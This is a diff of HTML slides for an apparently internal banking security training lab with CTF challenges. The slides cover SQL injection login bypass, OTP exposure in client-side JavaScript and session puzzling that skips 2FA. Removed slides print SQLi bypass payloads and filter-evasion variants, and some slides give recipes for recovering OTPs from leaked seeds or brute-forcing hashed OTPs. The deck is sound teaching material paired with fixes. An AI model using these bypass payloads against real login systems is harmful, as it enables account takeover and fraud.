 <div class="card red-left mt2" style="padding:.9rem 1.2rem"><h3 style="font-size:.95rem">And when it reaches customers &mdash; TalkTalk, UK</h3><p class="desc mt1" style="font-size:.88rem">An inherited legacy page with the identical flaw cost TalkTalk <strong>157,000 customers&rsquo; data</strong>, a then-record <strong>&pound;400,000</strong> regulatory fine, around <strong>&pound;77 million</strong> in total costs and <strong>101,000 lost customers</strong>. The chief executive explained it on national television.</p></div>
 <div class="card accent-left mt2" style="padding:.9rem 1.2rem"><p class="desc" style="font-size:.92rem"><strong style="color:var(--t1)">Leadership question:</strong> our scanners check the code we write &mdash; who checks the security products we buy, and how fast can we patch an internet-facing appliance?</p></div>
 </div></section>
-<section id="s22" data-phase="Live Labs" data-kind="handson" class="slide"><div class="slide-inner">
-<div class="flex-row mb2"><span class="badge badge-yellow">&#128993; Your Turn</span><span style="color:var(--t3);font-size:.8rem">G1 &bull; Level 1 or 2 &bull; 5 minutes</span></div>
-<h2 class="mb2">Log In Without Any Password</h2>
+<section id="s28" data-phase="Live Labs" class="slide">
+<div class="slide-inner">
+<div class="flex-row mb2">
+<span class="badge badge-red">&#128308; Demo 2</span>
+<span style="color:var(--t3);font-size:.8rem">L11 • CWE-200 • OWASP A04:2021 • 100 pts</span>
+</div>
+<h2>Find the OTP Without a Phone</h2>
+<p class="big mt2">You've logged in with the correct Customer ID and password. You're on the OTP verification screen. You don't have the victim's phone.</p>
+<p class="big mt1" style="color:var(--amber)">Can you still get in?</p>
+
+</div>
+</section>
+<section id="s29" data-phase="Live Labs" class="slide"><div class="slide-inner">
+<div class="sol-head"><span class="sol-tag">L11</span><div><div class="sol-cwe">CWE-200 &middot; A04:2021 &middot; Level 0 &mdash; live demo</div><h2 style="margin:.06em 0">OTP in the Response Body</h2><div class="sol-where">&#128205; OTP screen &mdash; browser DevTools</div></div></div>
+<div class="grid2 mt2">
+<div>
+<p class="sub mb1">How to find it</p>
+<div class="step"><div class="step-num">1</div><div><p class="desc">You&rsquo;re on the OTP screen, waiting for a 4-digit code &mdash; without the victim&rsquo;s phone.</p></div></div>
+<div class="step"><div class="step-num">2</div><div><p class="desc">Open DevTools: <strong style="color:var(--t1)">F12</strong> (Windows) or <strong style="color:var(--t1)">Cmd+Opt+I</strong> (Mac) &rarr; Sources / Network.</p></div></div>
+<div class="step"><div class="step-num">3</div><div><p class="desc">The OTP is <em>already</em> in your browser &mdash; no new request needed.</p></div></div>
+<p class="desc mt2">The attacker&rsquo;s superpower isn&rsquo;t hacking &mdash; it&rsquo;s <strong style="color:var(--t1)">reading what the application is already sending</strong>.</p>
+</div>
+<div>
+<p class="sub mb1">What&rsquo;s in the shipped JavaScript</p>
+<pre class="sol-code"><span class="cmt">// otp-validation.js &mdash; loaded by the OTP page</span>
+var SESSION_DATA = {
+  "_t": "otp", "_v": "2.1.4",
+  <span class="inj">"_otp": "7241",</span>   <span class="cmt">&larr; the OTP</span>
+  <span class="inj">"_flag": "BANKSPLOIT{&hellip;}",</span> <span class="cmt">&larr; the CTF flag</span>
+  "_sid": "abc123", "_exp": 1719500000
+};</pre>
+<p class="desc">A developer left debug data in a script shipped to <b>every</b> browser. The OTP &mdash; a secret that should live only on the server &mdash; is sitting in client-side code.</p>
+</div>
+</div>
+</div></section>
+<section id="s30" data-phase="Live Labs" class="slide">
+<div class="slide-inner center">
+<h1 style="color:var(--red);font-size:clamp(1.5rem,2.9vw,2.3rem)">Client-side code is not secret.</h1>
+<p class="big mt2" style="color:var(--t2)">Everything sent to the browser is visible to the user. JavaScript files, hidden form fields, API responses, cookies — all of it is readable.</p>
+<div class="sep" style="max-width:200px;margin:2rem auto"></div>
+<p class="big">Secrets belong on the server. Never in JavaScript.</p>
+</div>
+</section>
+<section id="s31" data-phase="Live Labs" class="slide"><div class="slide-inner">
+<div class="flex-row mb2"><span class="badge badge-yellow">&#128161; Security Mindset</span><span style="color:var(--t3);font-size:.8rem">L11 &bull; OTP exposure</span></div>
+<h2 class="mb2">That worked. <span style="color:var(--amber)">Here is the thinking that stops it.</span></h2>
+<p class="desc mb2">To the business this looked like normal functionality. The gap was never a typo &mdash; it was a piece of trust nobody noticed they had placed.</p>
+<div class="grid3 gap2">
+<div class="card red-left"><p class="sub mb1" style="color:var(--red)">The app trusted</p><p class="desc">the browser with the very answer it was meant to check</p></div>
+<div class="card accent-left"><p class="sub mb1">Ask your team</p><p class="desc">&ldquo;Does the client ever receive what it is supposed to be checked against?&rdquo;</p></div>
+<div class="card green-left"><p class="sub mb1" style="color:var(--green)">And that&rsquo;s why you now have</p><p class="desc"><strong>MFA that evolved</strong> &mdash; Meta and Google lived through codes being read and replayed, so it moved to push-approval, passkeys/FIDO2 and short-lived RSA/TOTP tokens</p></div>
+</div>
+</div></section>
+<section id="s32" data-phase="Live Labs" data-kind="handson" class="slide"><div class="slide-inner">
+<div class="flex-row mb2"><span class="badge badge-yellow">&#128993; Your Turn</span><span style="color:var(--t3);font-size:.8rem">L11 &bull; Level 1 or 2 &bull; 5 minutes</span></div>
+<h2 class="mb2">Defeat 2FA on a Harder Setting</h2>
 <div class="yt">
 <div class="grid2 gap2">
 <div>
-<p class="sub mb1">Your objective</p>
-<p class="desc">I have turned off the simple comment trick. The login now strips the characters you used in the demo. Find another way to make the password check always pass.</p>
-<p class="sub mb1 mt2">If you get stuck</p>
-<p class="desc" style="font-size:.88rem">Think about what a database treats as <em>always true</em>.<br/>You do not need to comment out the rest &mdash; you need to make the condition true.<br/>Classic shape: <code>&#39; OR &#39;1&#39;=&#39;1</code> &mdash; adapt it to what gets through the filter.</p>
+<p class="sub mb1">The finding you reported</p>
+<p class="desc">You got past the one-time-code (2FA) step without ever having the customer&rsquo;s phone.</p>
+<div class="card red-left mt2" style="padding:.6rem .9rem"><p class="desc" style="font-size:.9rem"><strong style="color:var(--t1)">They didn&rsquo;t know it was there.</strong> The OTP was in the shipped JavaScript as a by-product of how the feature was built &mdash; left-over debug data, or a value the page genuinely used &mdash; and no one realised the browser was downloading a secret. They <strong>can&rsquo;t simply delete it</strong>: the page still depends on it. So instead of taking the secret off the client, they tried to <strong>hide it better</strong>. You don&rsquo;t know how &mdash; find out whether it is still reachable.</p></div>
 </div>
 <div>
 <p class="sub mb1">When it works</p>
@@ -545,77 +648,7 @@ tr:nth-child(even){background:rgba(15,23,42,.3)}
 
 </div>
 </div></section>
-<section id="s23" data-phase="Live Labs" class="slide"><div class="slide-inner"><div class="sol-head"><span class="sol-tag">G1</span><div><div class="sol-cwe">CWE-89 · A03:2021</div><h2 style="margin:.06em 0">SQL Injection — Login Bypass</h2><div class="sol-where">&#128205; /login — Customer ID box</div></div></div><div class="grid2 mt2"><div><p class="sub mb1">Goal</p><p class="desc">Sign in as <b>your own</b> account without knowing the password.</p><p class="sub mb1 mt3">Root cause</p><p class="desc">Your Customer ID is <b>concatenated straight into the login SQL</b>. A single quote ends the string literal, and everything you type after it is parsed as SQL — so you can rewrite the query's logic and drop the password check.</p></div><div><p class="sub mb1">Level ladder</p><div class="sol-ladder"><div class="sol-lrow"><span class="sol-lk">L0</span><span class="sol-lv">raw query, DB error shown</span></div><div class="sol-lrow"><span class="sol-lk">L1</span><span class="sol-lv">+ blacklist on comments/UNION</span></div><div class="sol-lrow"><span class="sol-lk">L2</span><span class="sol-lv">blind + bracketed + comment filter</span></div><div class="sol-lrow"><span class="sol-lk">L3</span><span class="sol-lv">parameterized + bcrypt</span></div></div><div class="card green-left mt3"><p class="desc" style="font-size:1rem"><b>L3 — secure:</b> a parameterized query (<code>customer_id = ?</code>) + <code>password_verify()</code> (bcrypt), one generic “Invalid credentials” message, and a 5-attempt lockout. Input is data, never SQL.</p></div></div></div></div></section>
-<section id="s24" data-phase="Live Labs" class="slide"><div class="slide-inner"><div class="sol-head"><span class="sol-tag">G1</span><h2 class="sol-lvlbadge l0" style="margin:0">L0 &mdash; Fully vulnerable (error-based)</h2><span class="sol-where" style="margin-left:auto">SQL Injection — Login Bypass</span></div><div class="grid2 mt2"><div><p class="sub mb1">The mitigation at this level</p><p class="desc">Nothing filtered. The raw database error is returned to the screen, so a lone quote confirms injection instantly.</p></div><div><p class="sub mb1">How to solve it</p><p class="desc">Comment the password check out of the query. <code>--</code> needs a trailing space.</p></div></div><pre class="sol-code">SELECT id, customer_id, name, role FROM users
-WHERE customer_id = '<span class="inj">BS100234' -- </span>'
-  AND password_md5 = '…'  <span class="cmt">← commented out, never runs</span></pre><p class="sub mb1 mt3">Payload</p><div class="sol-pay">BS100234' -- </div><div class="sol-paynote">your own Customer ID + any password</div></div></section>
-<section id="s25" data-phase="Live Labs" class="slide"><div class="slide-inner"><div class="sol-head"><span class="sol-tag">G1</span><h2 class="sol-lvlbadge l1" style="margin:0">L1 &mdash; Naive blacklist</h2><span class="sol-where" style="margin-left:auto">SQL Injection — Login Bypass</span></div><div class="grid2 mt2"><div><p class="sub mb1">The mitigation at this level</p><p class="desc">Blocks <code>--</code>, <code>#</code>, <code>/*</code> and <code>union</code> (rejects “Illegal characters”). The comment trick now fails — but <code>OR</code> is <b>not</b> blocked.</p></div><div><p class="sub mb1">How to solve it</p><p class="desc">You can't comment, so make the row match another way. <code>AND</code> binds tighter than <code>OR</code>, so an un-bracketed <code>OR</code> on your Customer ID is enough.</p></div></div><pre class="sol-code">WHERE customer_id = '<span class="inj">BS100234' OR '1'='1</span>'
-  AND password_md5 = '…'
-<span class="cmt">reads as:  customer_id='BS100234'  OR  ('1'='1' AND password=…)
-            └─ true on its own → row returned</span></pre><p class="sub mb1 mt3">Payload</p><div class="sol-pay">BS100234' OR '1'='1</div><div class="sol-paynote">no comment needed</div></div></section>
-<section id="s26" data-phase="Live Labs" class="slide"><div class="slide-inner"><div class="sol-head"><span class="sol-tag">G1</span><h2 class="sol-lvlbadge l2" style="margin:0">L2 &mdash; Blind + brackets + comment filter</h2><span class="sol-where" style="margin-left:auto">SQL Injection — Login Bypass</span></div><div class="grid2 mt2"><div><p class="sub mb1">The mitigation at this level</p><p class="desc">DB error <b>hidden</b> (blind). The Customer ID test is wrapped in <code>( )</code> with the password check <b>outside</b> the brackets. Comment tokens are also blacklisted — rejected with a <b>generic “Invalid credentials”</b> (same as a wrong password, so you can't even tell the filter tripped).</p></div><div><p class="sub mb1">How to solve it</p><p class="desc">A bare <code>OR</code> is now trapped inside the brackets, and you can't comment the tail away. <b>Supply the closing <code>)</code> yourself</b> to escape the parens, then <code>OR</code> at the top level — the query's own trailing <code>')</code> balances your quote. No comment.</p></div></div><pre class="sol-code">WHERE (customer_id = '<span class="inj">BS100234') OR ('1'='1</span>')
-  AND password_md5 = '…'
-<span class="cmt">reads as:  (customer_id='BS100234')  OR  ('1'='1' AND password=…)
-            password branch is false → whole clause = customer_id='BS100234'</span></pre><p class="sub mb1 mt3">Payload</p><div class="sol-pay">BS100234') OR ('1'='1</div><div class="sol-paynote">close the bracket, OR outside it</div><div class="sol-lesson">&#128161; Comment-blacklisting is <b>not</b> a SQLi defence — you break the bracket without one.</div></div></section>
-<section id="s27" data-phase="Live Labs" class="slide">
-<div class="slide-inner">
-<div class="flex-row mb2">
-<span class="badge badge-red">&#128308; Demo 2</span>
-<span style="color:var(--t3);font-size:.8rem">L11 • CWE-200 • OWASP A04:2021 • 100 pts</span>
-</div>
-<h2>Find the OTP Without a Phone</h2>
-<p class="big mt2">You've logged in with the correct Customer ID and password. You're on the OTP verification screen. You don't have the victim's phone.</p>
-<p class="big mt1" style="color:var(--amber)">Can you still get in?</p>
-<div class="mt3 flex-row" style="justify-content:center;gap:1.2rem">
-<p class="desc" style="font-size:1.1rem">⏱️ 8 minutes. Work in pairs if you'd like.</p>
-<button class="timer-btn" onclick="timerStart(480)">▶ Start 8:00</button>
-</div>
-</div>
-</section>
-<section id="s28" data-phase="Live Labs" class="slide">
-<div class="slide-inner">
-<h3 class="mb2">Instructions</h3>
-<div class="step"><div class="step-num">1</div><div><p class="desc">You're on the OTP verification page. The page is waiting for a 4-digit code.</p></div></div>
-<div class="step"><div class="step-num">2</div><div><p class="desc">Open DevTools: press <strong style="color:var(--t1)">F12</strong> (Windows) or <strong style="color:var(--t1)">Cmd+Opt+I</strong> (Mac).</p></div></div>
-<div class="step"><div class="step-num">3</div><div><p class="desc">Explore. The OTP is somewhere your browser has <em>already downloaded</em>. You don't need to make any new requests.</p></div></div>
-<div class="sep"></div>
-<p class="desc">The attacker's superpower isn't hacking — it's <strong style="color:var(--t1)">reading what the application is already sending</strong>.</p>
-</div>
-</section>
-<section id="s29" data-phase="Live Labs" class="slide">
-<div class="slide-inner">
-<h3 class="mb2">Hints (if you're stuck)</h3>
-<div class="flex-col gap2">
-<div class="card yellow-left"><p class="desc"><strong>Hint 1:</strong> Go to the <strong style="color:var(--t1)">Sources</strong> tab in DevTools.</p></div>
-<div class="card yellow-left"><p class="desc"><strong>Hint 2:</strong> Look at the JavaScript files the page loaded. There's one called <code>otp-validation.js</code>.</p></div>
-<div class="card yellow-left"><p class="desc"><strong>Hint 3:</strong> Open it. Search for <code>SESSION_DATA</code>. The OTP is right there — along with the CTF flag.</p></div>
-</div>
-</div>
-</section>
-<section id="s30" data-phase="Live Labs" class="slide">
-<div class="slide-inner">
-<h3 class="mb2">The Answer</h3>
-<pre><code><span class="cm">// otp-validation.js — loaded by the OTP page</span>
-<span class="kw">var</span> SESSION_DATA = {
-    <span class="str">"_t"</span>:    <span class="str">"otp"</span>,
-    <span class="str">"_v"</span>:    <span class="str">"2.1.4"</span>,
-    <span class="vuln-hl"><span class="str">"_otp"</span>:  <span class="str">"7241"</span></span>,       <span class="cm">// ← THE OTP</span>
-    <span class="vuln-hl"><span class="str">"_flag"</span>: <span class="str">"BANKSPLOIT{...}"</span></span>, <span class="cm">// ← THE CTF FLAG</span>
-    <span class="str">"_sid"</span>:  <span class="str">"abc123"</span>,
-    <span class="str">"_exp"</span>:  <span class="num">1719500000</span>
-};</code></pre>
-<p class="mt2 desc">A developer left debug data in a JavaScript file that gets shipped to every user's browser. The OTP — a secret that should only exist server-side — is embedded in client-side code.</p>
-</div>
-</section>
-<section id="s31" data-phase="Live Labs" class="slide">
-<div class="slide-inner center">
-<h1 style="color:var(--red);font-size:clamp(1.5rem,2.9vw,2.3rem)">Client-side code is not secret.</h1>
-<p class="big mt2" style="color:var(--t2)">Everything sent to the browser is visible to the user. JavaScript files, hidden form fields, API responses, cookies — all of it is readable.</p>
-<div class="sep" style="max-width:200px;margin:2rem auto"></div>
-<p class="big">Secrets belong on the server. Never in JavaScript.</p>
-</div>
-</section>
-<section id="s32" data-phase="Live Labs" class="slide"><div class="slide-inner">
+<section id="s33" data-phase="Live Labs" class="slide"><div class="slide-inner">
 <h3 class="mb1">The Fix &mdash; Keep the Secret on the Server</h3>
 <div class="grid2 gap2">
 <div>
@@ -643,12 +676,15 @@ WHERE customer_id = '<span class="inj">BS100234' -- </span>'
 </div>
 </div>
 </div></section>
-<section id="s33" data-phase="Live Labs" class="slide"><div class="slide-inner">
+<section id="s34" data-phase="Live Labs" class="slide"><div class="slide-inner">
 <h3 class="mb2">Who Should Have Caught This?</h3>
 <div class="card accent-left"><h3 style="color:var(--indigo);font-size:1.02rem">Application Security</h3><p class="desc mt1" style="font-size:.9rem"><strong>Nothing sensitive goes to the client.</strong> Secrets, internal identifiers, debug objects and verification values must never be serialised into a page or an API response &ldquo;because the front end needs it.&rdquo;</p><p class="desc mt1" style="font-size:.9rem"><strong>Review the response, not just the request.</strong> Most review effort goes into validating what comes in. This class of flaw is entirely about what goes out.</p></div><div class="card accent-left mt2"><h3 style="color:var(--indigo);font-size:1.02rem">Penetration Testing</h3><p class="desc mt1" style="font-size:.9rem"><strong>Automated scanners rarely catch this.</strong> The page works perfectly and returns HTTP 200. Finding it requires a human reading the response and asking &ldquo;why is this here?&rdquo;</p></div>
 <p class="mt2 big center" style="font-size:clamp(.95rem,1.6vw,1.2rem)">&ldquo;What does our application send to the browser that it does not actually need to?&rdquo;</p>
 </div></section>
-<section id="s34" data-phase="Live Labs" data-kind="real" class="slide"><div class="slide-inner">
+<section id="s35" data-phase="Live Labs" class="slide"><div class="slide-inner"><div class="sol-head"><span class="sol-tag">L11</span><div><div class="sol-cwe">CWE-200 · A04:2021</div><h2 style="margin:.06em 0">OTP in Response Body</h2><div class="sol-where">&#128205; /login → OTP screen; the script /public/js/otp-validation.js</div></div></div><div class="grid2 mt2"><div><p class="sub mb1">Goal</p><p class="desc">Recover the 2FA OTP from the <b>client</b>, not the victim's phone.</p><p class="sub mb1 mt3">Root cause</p><p class="desc">The login OTP is injected server-side into a dynamically-built JavaScript file (<code>otp-validation.js</code>, the <code>SESSION_DATA</code> object). Anything the browser receives, the user can read — so a secret that rides down to the client is already lost.</p></div><div><p class="sub mb1">Level ladder</p><div class="sol-ladder"><div class="sol-lrow"><span class="sol-lk">L0</span><span class="sol-lv">plaintext OTP + flag in JS</span></div><div class="sol-lrow"><span class="sol-lk">L1</span><span class="sol-lv">OTP derivable from leaked seed+uid</span></div><div class="sol-lrow"><span class="sol-lk">L2</span><span class="sol-lv">hash+sealed flag in headers</span></div><div class="sol-lrow"><span class="sol-lk">L3</span><span class="sol-lv">OTP never leaves the server</span></div></div><div class="card green-left mt3"><p class="desc" style="font-size:1rem"><b>L3 — secure:</b> nothing OTP-related is injected into the script. The code the OTP is <b>verified entirely server-side</b> — there is nothing on the client to read, recompute or brute-force.</p></div></div></div></div></section>
+<section id="s36" data-phase="Live Labs" class="slide"><div class="slide-inner"><div class="sol-head"><span class="sol-tag">L11</span><h2 class="sol-lvlbadge l1" style="margin:0">L1 &mdash; Predictable from seed + uid</h2><span class="sol-where" style="margin-left:auto">OTP in Response Body</span></div><div class="grid2 mt2"><div><p class="sub mb1">The mitigation at this level</p><p class="desc">No plaintext OTP. The token id leaks as <code>_seed</code>, the user id as <code>_uid</code>; the flag is sealed in <code>_flag_enc</code>.</p></div><div><p class="sub mb1">How to solve it</p><p class="desc">Recompute the OTP, then unseal the flag. Inputs are concatenated as <b>strings</b>, not added.</p></div></div><p class="sub mb1 mt3">Payload</p><div class="sol-pay">otp = parseInt( sha256(_seed + _uid)[:8], 16) % 10000</div><div class="sol-paynote">then flag = _flag_enc XOR sha256(otp)</div></div></section>
+<section id="s37" data-phase="Live Labs" class="slide"><div class="slide-inner"><div class="sol-head"><span class="sol-tag">L11</span><h2 class="sol-lvlbadge l2" style="margin:0">L2 &mdash; Secrets in response headers</h2><span class="sol-where" style="margin-left:auto">OTP in Response Body</span></div><div class="grid2 mt2"><div><p class="sub mb1">The mitigation at this level</p><p class="desc">The body carries only breadcrumbs. The OTP hash <code>X-Otp-Check = sha256(otp)</code> and the sealed <code>X-Flag-Enc</code> ride in the <b>response headers</b> of the script.</p></div><div><p class="sub mb1">How to solve it</p><p class="desc">Read the response headers (Network tab), then brute-force the 10,000-value OTP space against the hash — trivial — and decrypt the sealed flag.</p></div></div><p class="sub mb1 mt3">Payload</p><div class="sol-pay">for otp in 0000..9999: if sha256(otp)==X-Otp-Check → decrypt X-Flag-Enc</div><div class="sol-paynote">4-digit space = instant</div></div></section>
+<section id="s38" data-phase="Live Labs" data-kind="real" class="slide"><div class="slide-inner">
 <span class="rw-tag">&#9888; This actually happened</span>
 <h2 class="mt2 mb1">Star Health, 2024 &mdash; when the data became self-service</h2>
 <div class="rw mt2">
@@ -658,38 +694,12 @@ WHERE customer_id = '<span class="inj">BS100234' -- </span>'
 <div class="card yellow-left mt2" style="padding:.9rem 1.2rem"><h3 style="font-size:.95rem">The same shape, globally &mdash; T-Mobile, 2023</h3><p class="desc mt1" style="font-size:.88rem">A single API returned more customer data than any screen ever displayed. Nothing was &ldquo;hacked&rdquo; &mdash; attackers simply asked, repeatedly. <strong>37 million accounts</strong>, running roughly <strong>41 days</strong> before detection.</p></div>
 <div class="card accent-left mt2" style="padding:.9rem 1.2rem"><p class="desc" style="font-size:.92rem"><strong style="color:var(--t1)">Leadership question:</strong> who inside our organisation can query customer data at scale &mdash; and would any alert fire if they did it every day for a month?</p></div>
 </div></section>
-<section id="s35" data-phase="Live Labs" data-kind="handson" class="slide"><div class="slide-inner">
-<div class="flex-row mb2"><span class="badge badge-yellow">&#128993; Your Turn</span><span style="color:var(--t3);font-size:.8rem">L11 &bull; Level 1 or 2 &bull; 5 minutes</span></div>
-<h2 class="mb2">Defeat 2FA on a Harder Setting</h2>
-<div class="yt">
-<div class="grid2 gap2">
-<div>
-<p class="sub mb1">Your objective</p>
-<p class="desc">At Level 0 the OTP sat in plain sight in the JavaScript. At this level it is obfuscated and moved. The code the browser receives still contains everything it needs &mdash; find where the real value is computed.</p>
-<p class="sub mb1 mt2">If you get stuck</p>
-<p class="desc" style="font-size:.88rem">Network tab: inspect the response to the login/OTP request, not just the page source.<br/>The value may be encoded (Base64) or assembled from pieces. The browser has to reassemble it &mdash; so can you.<br/>Anything the client needs to <em>check</em> an OTP, the client can be made to <em>reveal</em>.</p>
-</div>
-<div>
-<p class="sub mb1">When it works</p>
-<div class="step"><div class="step-num">1</div><div><p class="desc">The app reveals a <strong>flag</strong> &mdash; <code>BANKSPLOIT{...}</code></p></div></div>
-<div class="step"><div class="step-num">2</div><div><p class="desc">Hit <strong>Claim</strong>, or paste it into Submit Flag</p></div></div>
-<div class="step"><div class="step-num">3</div><div><p class="desc">Your points land on the leaderboard</p></div></div>
-<button class="timer-btn mt2" onclick="timerStart(300)">&#9654; Start 5:00 timer</button>
-</div>
-</div>
-
-</div>
-</div></section>
-<section id="s36" data-phase="Live Labs" class="slide"><div class="slide-inner"><div class="sol-head"><span class="sol-tag">L11</span><div><div class="sol-cwe">CWE-200 · A04:2021</div><h2 style="margin:.06em 0">OTP in Response Body</h2><div class="sol-where">&#128205; /login → OTP screen; the script /public/js/otp-validation.js</div></div></div><div class="grid2 mt2"><div><p class="sub mb1">Goal</p><p class="desc">Recover the 2FA OTP from the <b>client</b>, not the victim's phone.</p><p class="sub mb1 mt3">Root cause</p><p class="desc">The login OTP is injected server-side into a dynamically-built JavaScript file (<code>otp-validation.js</code>, the <code>SESSION_DATA</code> object). Anything the browser receives, the user can read — so a secret that rides down to the client is already lost.</p></div><div><p class="sub mb1">Level ladder</p><div class="sol-ladder"><div class="sol-lrow"><span class="sol-lk">L0</span><span class="sol-lv">plaintext OTP + flag in JS</span></div><div class="sol-lrow"><span class="sol-lk">L1</span><span class="sol-lv">OTP derivable from leaked seed+uid</span></div><div class="sol-lrow"><span class="sol-lk">L2</span><span class="sol-lv">hash+sealed flag in headers</span></div><div class="sol-lrow"><span class="sol-lk">L3</span><span class="sol-lv">OTP never leaves the server</span></div></div><div class="card green-left mt3"><p class="desc" style="font-size:1rem"><b>L3 — secure:</b> nothing OTP-related is injected into the script. The code the OTP is <b>verified entirely server-side</b> — there is nothing on the client to read, recompute or brute-force.</p></div></div></div></div></section>
-<section id="s37" data-phase="Live Labs" class="slide"><div class="slide-inner"><div class="sol-head"><span class="sol-tag">L11</span><h2 class="sol-lvlbadge l0" style="margin:0">L0 &mdash; Plaintext in the JS body</h2><span class="sol-where" style="margin-left:auto">OTP in Response Body</span></div><div class="grid2 mt2"><div><p class="sub mb1">The mitigation at this level</p><p class="desc">The OTP sits in plaintext in <code>_otp</code> and the flag in <code>_flag</code>, right in the served script.</p></div><div><p class="sub mb1">How to solve it</p><p class="desc">Open DevTools → Sources/Network → <code>otp-validation.js</code> and read them. Or in the console:</p></div></div><p class="sub mb1 mt3">Payload</p><div class="sol-pay">fetch('/public/js/otp-validation.js') → read _otp and _flag</div><div class="sol-paynote">everything is exposed</div></div></section>
-<section id="s38" data-phase="Live Labs" class="slide"><div class="slide-inner"><div class="sol-head"><span class="sol-tag">L11</span><h2 class="sol-lvlbadge l1" style="margin:0">L1 &mdash; Predictable from seed + uid</h2><span class="sol-where" style="margin-left:auto">OTP in Response Body</span></div><div class="grid2 mt2"><div><p class="sub mb1">The mitigation at this level</p><p class="desc">No plaintext OTP. The token id leaks as <code>_seed</code>, the user id as <code>_uid</code>; the flag is sealed in <code>_flag_enc</code>.</p></div><div><p class="sub mb1">How to solve it</p><p class="desc">Recompute the OTP, then unseal the flag. Inputs are concatenated as <b>strings</b>, not added.</p></div></div><p class="sub mb1 mt3">Payload</p><div class="sol-pay">otp = parseInt( sha256(_seed + _uid)[:8], 16) % 10000</div><div class="sol-paynote">then flag = _flag_enc XOR sha256(otp)</div></div></section>
-<section id="s39" data-phase="Live Labs" class="slide"><div class="slide-inner"><div class="sol-head"><span class="sol-tag">L11</span><h2 class="sol-lvlbadge l2" style="margin:0">L2 &mdash; Secrets in response headers</h2><span class="sol-where" style="margin-left:auto">OTP in Response Body</span></div><div class="grid2 mt2"><div><p class="sub mb1">The mitigation at this level</p><p class="desc">The body carries only breadcrumbs. The OTP hash <code>X-Otp-Check = sha256(otp)</code> and the sealed <code>X-Flag-Enc</code> ride in the <b>response headers</b> of the script.</p></div><div><p class="sub mb1">How to solve it</p><p class="desc">Read the response headers (Network tab), then brute-force the 10,000-value OTP space against the hash — trivial — and decrypt the sealed flag.</p></div></div><p class="sub mb1 mt3">Payload</p><div class="sol-pay">for otp in 0000..9999: if sha256(otp)==X-Otp-Check → decrypt X-Flag-Enc</div><div class="sol-paynote">4-digit space = instant</div></div></section>
-<section id="s40" data-phase="Live Labs" class="slide"><div class="slide-inner">
+<section id="s39" data-phase="Live Labs" class="slide"><div class="slide-inner">
 <div class="flex-row mb2"><span class="badge badge-red">&#128308; Demo 3</span><span style="color:var(--t3);font-size:.8rem">L25 &bull; CWE-841 &bull; OWASP A04:2021</span></div>
 <h1>Session Puzzling &mdash; Walk In Half-Authenticated</h1>
 <p class="big mt2">&ldquo;We&rsquo;re going to skip the second factor entirely &mdash; by never finishing the login.&rdquo;</p>
 </div></section>
-<section id="s41" data-phase="Live Labs" class="slide"><div class="slide-inner">
+<section id="s40" data-phase="Live Labs" class="slide"><div class="slide-inner">
 <h3 class="mb2">Login Is Not One Step. It Is a Conversation.</h3>
 <p class="desc mb2">Most banking logins are built in stages. Each stage records something in your session.</p>
 <div class="flow mt2">
@@ -703,7 +713,7 @@ WHERE customer_id = '<span class="inj">BS100234' -- </span>'
 </div>
 <div class="card yellow-left mt3"><p class="desc">The session is built up <strong style="color:var(--t1)">piece by piece</strong>. The question the attacker asks is simple: <em>what does the application do if I show up at step 4 holding only the piece from step 1?</em></p></div>
 </div></section>
-<section id="s42" data-phase="Live Labs" class="slide"><div class="slide-inner">
+<section id="s41" data-phase="Live Labs" class="slide"><div class="slide-inner">
 <h3 class="mb1">The Vulnerable Code</h3>
 <p class="desc mb2">Two different variables mean two very different things &mdash; and the guard accepts either one.</p>
 <div class="grid2 gap2">
@@ -728,13 +738,44 @@ WHERE customer_id = '<span class="inj">BS100234' -- </span>'
 </div>
 </div>
 </div></section>
-<section id="s43" data-phase="Live Labs" class="slide"><div class="slide-inner center">
+<section id="s42" data-phase="Live Labs" class="slide"><div class="slide-inner center">
 <h1 style="color:var(--red);font-size:clamp(1.5rem,2.9vw,2.3rem)">We entered a password, never touched the OTP,<br/>and the bank showed us the account anyway.</h1>
 <div class="sep" style="max-width:200px;margin:2rem auto"></div>
 <p class="big" style="color:var(--t2)">Two-factor authentication was fully implemented.<br/>It was simply not <em>required</em> on the page that mattered.</p>
 <p class="mt3 desc">Nobody bypassed the OTP. They just declined to answer it.</p>
 </div></section>
-<section id="s44" data-phase="Live Labs" class="slide"><div class="slide-inner">
+<section id="s43" data-phase="Live Labs" class="slide"><div class="slide-inner">
+<div class="flex-row mb2"><span class="badge badge-yellow">&#128161; Security Mindset</span><span style="color:var(--t3);font-size:.8rem">L25 &bull; Session puzzling</span></div>
+<h2 class="mb2">That worked. <span style="color:var(--amber)">Here is the thinking that stops it.</span></h2>
+<p class="desc mb2">To the business this looked like normal functionality. The gap was never a typo &mdash; it was a piece of trust nobody noticed they had placed.</p>
+<div class="grid3 gap2">
+<div class="card red-left"><p class="sub mb1" style="color:var(--red)">The app trusted</p><p class="desc">&ldquo;login started&rdquo; as if it meant &ldquo;login finished&rdquo;</p></div>
+<div class="card accent-left"><p class="sub mb1">Ask your team</p><p class="desc">&ldquo;Does every sensitive page re-check that the session is <em>fully</em> authenticated?&rdquo;</p></div>
+<div class="card green-left"><p class="sub mb1" style="color:var(--green)">And that&rsquo;s why you now have</p><p class="desc"><strong>step-up authentication</strong> and strict session state &mdash; re-verify at each sensitive action, not at one early gate</p></div>
+</div>
+</div></section>
+<section id="s44" data-phase="Live Labs" data-kind="handson" class="slide"><div class="slide-inner">
+<div class="flex-row mb2"><span class="badge badge-yellow">&#128993; Your Turn</span><span style="color:var(--t3);font-size:.8rem">L25 &bull; Level 1 or 2 &bull; 5 minutes</span></div>
+<h2 class="mb2">Reach the Dashboard Without the OTP</h2>
+<div class="yt">
+<div class="grid2 gap2">
+<div>
+<p class="sub mb1">The finding you reported</p>
+<p class="desc">You reached a logged-in dashboard without ever completing the second-factor (OTP) step.</p>
+<div class="card red-left mt2" style="padding:.6rem .9rem"><p class="desc" style="font-size:.9rem"><strong style="color:var(--t1)">Now retest the fix.</strong> You reported this finding; the developers have since shipped a fix. Confirm whether it actually holds &mdash; you have <strong>no information</strong> about what they changed, and about 5 minutes to try.</p></div>
+</div>
+<div>
+<p class="sub mb1">When it works</p>
+<div class="step"><div class="step-num">1</div><div><p class="desc">The app reveals a <strong>flag</strong> &mdash; <code>BANKSPLOIT{...}</code></p></div></div>
+<div class="step"><div class="step-num">2</div><div><p class="desc">Hit <strong>Claim</strong>, or paste it into Submit Flag</p></div></div>
+<div class="step"><div class="step-num">3</div><div><p class="desc">Your points land on the leaderboard</p></div></div>
+<button class="timer-btn mt2" onclick="timerStart(300)">&#9654; Start 5:00 timer</button>
